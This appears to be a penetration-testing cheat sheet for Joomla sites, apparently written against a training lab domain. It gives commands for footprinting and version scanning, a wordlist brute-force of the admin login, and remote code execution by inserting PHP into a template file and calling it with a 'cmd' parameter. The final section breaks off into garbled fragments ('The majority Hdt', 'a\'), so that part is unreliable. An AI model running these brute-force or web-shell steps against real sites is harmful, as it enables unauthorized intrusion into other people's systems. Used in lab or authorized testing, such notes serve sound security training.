# Joomla

Open source CMS written in PHP with a MySQL backend.

### Discovery/Footprinting

Investigating page source code:&#x20;

```shell-session
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Joomla has a distinct Robots.txt:

```shell-session
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Checking the readme.txt:&#x20;

```shell-session
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

Checking JS files in media/system/js or administrator/manifests/files/joomla.xml:

```shell-session
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
  
 <SNIP>
```

&#x20; You can also look for the install version in plugins/system/cache/cache.xml.

### Version Enumeration w/ DropeScan

{% embed url="https://github.com/SamJoan/droopescan" %}

```shell-session
droopescan scan joomla --url http://dev.inlanefreight.local/
```

### JoomlaScan

{% embed url="https://github.com/drego85/JoomlaScan.git" %}

```shell-session
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

### Login Brute Force&#x20;

{% embed url="https://github.com/ajnik/joomla-bruteforce" %}

```
python3 joomla-brute.py -u http://10.10.10.150 -w /usr/share/wordlist/rockyou.txt -usr admin

chmod +x joomla-brute.py
./joomla-brute.py -u http://10.10.10.150 -w /usr/share/wordlist/rockyou.txt -usr admin
```

Default admin login portal is at http://\<URL>/administrator/index.php and the default username is admin.

### RCE via theme editor&#x20;

Similar to Wordpress, you can edit a page of a theme's PHP caaode to include malicious code and execute it by accessing the page through the browser or with curl.&#x20;

Configuration -> Templates -> Select Template -> input PHP code&#x20;

Excute PHP code:&#x20;

```shell-session
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id
```

### Leveraging known vulnerabilities&#x20;

The majority Hdt&#x20;



a\
